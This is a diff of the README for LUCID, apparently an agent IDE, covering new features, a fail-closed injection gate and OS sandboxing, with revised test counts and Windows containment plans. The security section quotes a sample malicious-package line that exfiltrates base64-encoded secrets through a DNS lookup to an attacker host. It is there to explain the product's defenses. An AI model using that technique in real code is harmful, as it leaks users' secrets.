@@ -30,7 +30,7 @@
 <a href="https://github.com/mlcyclops/lucidagentide/actions/workflows/build-desktop.yml"><img src="https://img.shields.io/github/actions/workflow/status/mlcyclops/lucidagentide/build-desktop.yml?label=Windows%20Build&logo=windows&logoColor=white&style=flat-square" alt="Windows Build" /></a>
 <a href="https://github.com/mlcyclops/lucidagentide/actions/workflows/build-desktop.yml"><img src="https://img.shields.io/github/actions/workflow/status/mlcyclops/lucidagentide/build-desktop.yml?label=macOS%20Build&logo=apple&logoColor=white&style=flat-square" alt="macOS Build" /></a>
 <a href="https://github.com/mlcyclops/lucidagentide/actions/workflows/build-desktop.yml"><img src="https://img.shields.io/github/actions/workflow/status/mlcyclops/lucidagentide/build-desktop.yml?label=Linux%20Build&logo=linux&logoColor=white&style=flat-square" alt="Linux Build" /></a>
-<img src="https://img.shields.io/badge/tests-545%20harness%20%2B%20689%20desktop%20%2B%2057%20sidecar-46d27e?style=flat-square" alt="tests" />
+<img src="https://img.shields.io/badge/tests-700%20harness%20%2B%20979%20desktop%20%2B%2057%20sidecar-46d27e?style=flat-square" alt="tests" />
 <img src="https://img.shields.io/badge/gate-fail--closed-e07bf0?style=flat-square" alt="fail-closed gate" />
 
 <br/>
@@ -73,16 +73,16 @@ personalization internals are proprietary and intentionally undocumented here - 
 
 <br/>
 
-<!-- ✦✦✦  HEADLINE BANNER — Claude Fable 5  ✦✦✦ -->
+<!-- ✦✦✦  HEADLINE BANNER - Claude Fable 5  ✦✦✦ -->
 <table align="center" width="100%">
 <tr>
 <td align="center">
 
-# ✦ Claude&nbsp;5.0&nbsp;**Fable** is here — available through LUCID ✦
+# ✦ Claude&nbsp;5.0&nbsp;**Fable** is here - available through LUCID ✦
 
 ### The newest Claude model, <b>Claude&nbsp;Fable&nbsp;5</b> (<code>claude-fable-5</code>), is live in the model picker.
 
-<p align="center"><b>Connect a Claude account</b> (OAuth or <code>ANTHROPIC_API_KEY</code>) and pick <b>Claude&nbsp;Fable&nbsp;5</b> from the model list — that's it. It routes through Anthropic and carries a clear <b>U.S.-government data-privacy notice</b> so you always know where your chat history stands.</p>
+<p align="center"><b>Connect a Claude account</b> (OAuth or <code>ANTHROPIC_API_KEY</code>) and pick <b>Claude&nbsp;Fable&nbsp;5</b> from the model list - that's it. It routes through Anthropic and carries a clear <b>U.S.-government data-privacy notice</b> so you always know where your chat history stands.</p>
 
 </td>
 </tr>
@@ -90,9 +90,9 @@ personalization internals are proprietary and intentionally undocumented here - 
 
 <br/>
 
-<h3 align="center">🌐 Also new — your agent is online out of the box, and every tool call works</h3>
+<h3 align="center">🌐 Also new - your agent is online out of the box, and every tool call works</h3>
 
-<p align="center"><b>“Allow all websites + local LAN” is pre-checked</b>, so a fresh agent can browse and search the web immediately — while the curated, trust-scoped whitelist is one toggle away whenever you want to lock it down (it still asks before a public IP or a foreign-country site). And <b>v1.8.26 fixes a regression</b> where <code>bash</code> / <code>eval</code> / edit tool calls could silently fail with “denied by user” — approvals now surface correctly and gated commands run once approved.</p>
+<p align="center"><b>“Allow all websites + local LAN” is pre-checked</b>, so a fresh agent can browse and search the web immediately - while the curated, trust-scoped whitelist is one toggle away whenever you want to lock it down (it still asks before a public IP or a foreign-country site). And <b>v1.8.26 fixes a regression</b> where <code>bash</code> / <code>eval</code> / edit tool calls could silently fail with “denied by user” - approvals now surface correctly and gated commands run once approved.</p>
 
 </div>
 
@@ -182,29 +182,29 @@ personalization internals are proprietary and intentionally undocumented here - 
 
 ## ✨ What's new in v1.10.0
 
-> The biggest batch since 1.9 — run **local models**, a multimodal agent that **reviews its own UI**, native
+> The biggest batch since 1.9 - run **local models**, a multimodal agent that **reviews its own UI**, native
 > **Figma** import, an **Agent Builder**, and a **security firewall** for remote agents. (v1.9.2 also shipped a
-> battery-aware performance epic — calmer knowledge-graph rendering and faster switches on battery.)
+> battery-aware performance epic - calmer knowledge-graph rendering and faster switches on battery.)
 
-- **🖥️ Local & hybrid providers** — point LUCID at a **self-hosted or custom LLM** (Ollama · llama.cpp · vLLM ·
+- **🖥️ Local & hybrid providers** - point LUCID at a **self-hosted or custom LLM** (Ollama · llama.cpp · vLLM ·
   any OpenAI-compatible endpoint), including a private box reached **over a VPN** (e.g. a DGX behind SonicWall).
   Keys live in the **OS-encrypted vault** and never reach the renderer or the agent; add, key, and test each one
   from a Settings card. *(ADR-0135)*
-- **🖼️ Multimodal prompts** — **paste or drop a screenshot** straight into the prompt bar; it shows as a thumbnail
-  above the composer and travels to the model as an image **only when you hit send** — no auto-push. *(ADR-0136)*
-- **👁️ The agent reviews & tests its work live** — as it screenshots, reads the DOM, and **clicks / types** in the
-  in-app Preview to verify its UI, the panel **glows** and a **"testing" pill** shows you exactly what it's doing —
+- **🖼️ Multimodal prompts** - **paste or drop a screenshot** straight into the prompt bar; it shows as a thumbnail
+  above the composer and travels to the model as an image **only when you hit send** - no auto-push. *(ADR-0136)*
+- **👁️ The agent reviews & tests its work live** - as it screenshots, reads the DOM, and **clicks / types** in the
+  in-app Preview to verify its UI, the panel **glows** and a **"testing" pill** shows you exactly what it's doing -
   all over a sandboxed postMessage bridge (no eval, egress stays blocked). *(ADR-0153)*
-- **🎨 DESIGN.md + native Figma** — a project **`DESIGN.md`** is honored every turn like `CLAUDE.md`; **`/figma`**
+- **🎨 DESIGN.md + native Figma** - a project **`DESIGN.md`** is honored every turn like `CLAUDE.md`; **`/figma`**
   imports a design into the Preview (token in the vault, used server-side only), then the agent **reviews it** or
   **builds a DESIGN.md** from it for you to edit in the IDE. *(ADR-0154)*
-- **🤖 Agent Builder** — **describe an agent and LUCID builds it**: an allow-list chip editor, live per-turn canvas
+- **🤖 Agent Builder** - **describe an agent and LUCID builds it**: an allow-list chip editor, live per-turn canvas
   collaboration, portable **share / import** with credential provisioning, **n8n** interop, and your own saved
   **`/command`s**. *(ADR-0137–0146)*
-- **🧯 Agent Firewall** — reach remote **hermes / openclaw** agent runtimes through a **fail-closed security proxy**
+- **🧯 Agent Firewall** - reach remote **hermes / openclaw** agent runtimes through a **fail-closed security proxy**
   that scans both directions (blocks injected instructions outbound, quarantines + delimits replies inbound), with
-  per-connection permission policy — plus an in-process gate for **every MCP tool result**. *(ADR-0147–0152)*
-- **⌨️ Neovim & terminal** — drive LUCID from **Neovim** and the terminal, not just the desktop app. *(ADR-0150/0151)*
+  per-connection permission policy - plus an in-process gate for **every MCP tool result**. *(ADR-0147–0152)*
+- **⌨️ Neovim & terminal** - drive LUCID from **Neovim** and the terminal, not just the desktop app. *(ADR-0150/0151)*
 
 ---
 
@@ -264,7 +264,7 @@ Thirteen things you rarely find together. Each is in plain language below - the 
 |:--|:--|
 | 🛡️ **Security *around* a moving target** | The injection defense lives in omp's extensions, so it upgrades with omp - no fork, no merge debt. |
 | 🔒 **A gate that cannot fail open** | If the scanner dies or returns garbage, the gate **blocks** (never "safe"). A test kills it mid-run and the block still holds. |
-| 🧱 **Runtime containment, not just approval** | Even after `bash` is approved, the process runs **OS-isolated** (Linux bwrap · macOS Seatbelt · Windows AppContainer) and its network is **mediated** - a package that phones home over a DNS lookup at import time is **refused and audited**, while `pip install` still works. |
+| 🧱 **Runtime containment, not just approval** | Even after `bash` is approved, the process runs **OS-isolated** (Linux bwrap · macOS Seatbelt today; Windows AppContainer planned for enterprise) and its network is **mediated** - a package that phones home over a DNS lookup at import time is **refused and audited**, while `pip install` still works. |
 | 🧬 **Provenance-gated memory** | Suspicious or quarantined content can **never auto-save** into memory. Trust comes from the source, not the caller's word. |
 | 🧊 **A cache-stable prompt** | The safety layers are byte-identical on every request. Untrusted text only ever enters **delimited** and **after** the cache point - faster *and* safer. |
 | 🏛️ **A gov-grade gateway, gated** | [AskSage](https://asksage.ai) is wired in with a lockdown mode, **scanned** personas, and answers grounded on your own datasets, with citations. |
@@ -360,7 +360,7 @@ working memory - lives in the **tail after the cache breakpoint**. Untrusted byt
 | **Scan** | `scanner-sidecar/` (pure Unicode) behind NDJSON | finds zero-width, bidi, tag-block, homoglyph, PUA, `Cf` |
 | **Decide** | `gate.ts` → `scanAndDecide` | any scan failure ⇒ **block / quarantine** (never "safe") |
 | **Gate** | `harness/omp/security_extension.ts` (omp pre-hook) | runs **in-process** on every tool call |
-| **Contain** | `harness/runs/sandbox_exec.ts` (bwrap · Seatbelt · AppContainer) + `egress_proxy.ts` | an approved process runs **runtime-isolated**; subprocess DNS/CONNECT is **mediated + audited** (fail-closed) |
+| **Contain** | `harness/runs/sandbox_exec.ts` (bwrap · Seatbelt; Windows AppContainer = enterprise) + `egress_proxy.ts` | an approved process runs **runtime-isolated**; subprocess DNS/CONNECT is **mediated + audited** (fail-closed) |
 | **Label** | closed set `trusted · untrusted · suspicious · quarantined` | no other values exist |
 | **Promote** | `promotion_gate.ts` | suspicious/quarantined sources can't enter semantic memory |
 | **Export** | `safe_export.ts` | invisibles escaped to `\u{..}`; raw referenced by `sha256`, never inline |
@@ -379,15 +379,23 @@ load-bearing invariants (fail-closed, extend-don't-fork, frozen contracts, byte-
 once `bash` / `pip` / `python` is approved and executing, a malicious dependency can still phone home at
 **import time** - the classic trick is a package whose `__init__.py` does `socket.gethostbyname("<base64-secrets>.attacker.cn")`,
 exfiltrating over a DNS lookup that no argv classifier can catch. LUCID closes that hole *beneath* the gate:
-an approved process is **OS-isolated** (Linux **bubblewrap** · macOS **Seatbelt** · Windows **AppContainer**,
-picked per platform; where none is available LUCID says so out loud and the org can require isolation to
-**fail-closed** instead), and its network is not raw but **mediated** - every subprocess DNS query and CONNECT
-is routed through a loopback proxy and decided by the **same** curated egress policy your browser tools already
-use. So a lookup to a non-whitelisted or foreign-country host is **refused and audited** (a metadata-only
-`egress` event to your SIEM), while `pip install requests` still resolves and works. The whole posture -
-which backend is active, whether egress is mediated, and every reach-out the proxy refused - is visible in the
-Security panel. *(Linux + macOS enforce today; the Windows AppContainer helper is landing. Fail-closed by
-construction: no isolating backend under managed policy ⇒ exec is blocked, never silently un-isolated.)*
+an approved process is **OS-isolated** (Linux **bubblewrap** · macOS **Seatbelt**, picked per platform; where
+none is available LUCID says so out loud and the org can require isolation to **fail-closed** instead), and
+its network is not raw but **mediated** - every subprocess DNS query and CONNECT is routed through a loopback
+proxy and decided by the **same** curated egress policy your browser tools already use. So a lookup to a
+non-whitelisted or foreign-country host is **refused and audited** (a metadata-only `egress` event to your
+SIEM), while `pip install requests` still resolves and works. The whole posture - which backend is active,
+whether egress is mediated, and every reach-out the proxy refused - is visible in the Security panel.
+*(Linux + macOS enforce today. Fail-closed by construction: no isolating backend under managed policy ⇒
+exec is blocked, never silently un-isolated.)*
+
+> **🏛️ Windows runtime containment (planned, enterprise).** A native **Windows AppContainer** backend is
+> built and verified for the network-off case (an empty-capability AppContainer has no outbound network at
+> all). But **mediated** egress - letting a contained process reach only the loopback proxy while the rest of
+> the internet stays blocked - requires a one-time **administrator** loopback exemption at install
+> (`CheckNetIsolation`), so full Windows runtime containment ships as a **managed / enterprise** capability
+> rather than a standard-install default. Until then, Windows uses the disclosed passthrough for
+> network-capable sessions - the argv gate + in-process scanner still apply on every OS.
 
 **Network whitelist + credential vault (ADR-0106).** Beyond the ad-hoc "always allow this site" the per-site
 egress gate remembers, Settings → **Network Whitelist** lets you curate an allow-list up front: domain patterns
@@ -521,7 +529,7 @@ cd scanner-sidecar && uv sync     # pinned Python sidecar venv
 
 # prove it end-to-end
 bun run demo-00                   # omp echo round-trip + scanner + fail-closed proof
-make test                         # full suite: harness + desktop + scanner sidecar (1,100+ tests)
+make test                         # full suite: harness + desktop + scanner sidecar (1,700+ tests)
 bun run demo-P4.3                 # poisoned memory can't auto-promote (keystone #2)
 bun run demo-P2.1                 # unicode scanner: every finding fires, clean corpus is FP-free
 ```
@@ -726,7 +734,7 @@ robustness (Windows + macOS installers).
 | [`PROGRESS.md`](PROGRESS.md) | Per-session build log: shipped / stubbed / next |
 | [`desktop/README.md`](desktop/README.md) | The desktop GUI + dev server |
 | [`CHEATSHEET.md`](CHEATSHEET.md) | Day-to-day commands |
-| [`docs/guides/`](docs/guides/README.md) | **Role-based user guides** — Developer / Security / Manager / Executive walkthroughs |
+| [`docs/guides/`](docs/guides/README.md) | **Role-based user guides** - Developer / Security / Manager / Executive walkthroughs |
 
 <div align="center">
 <br/>
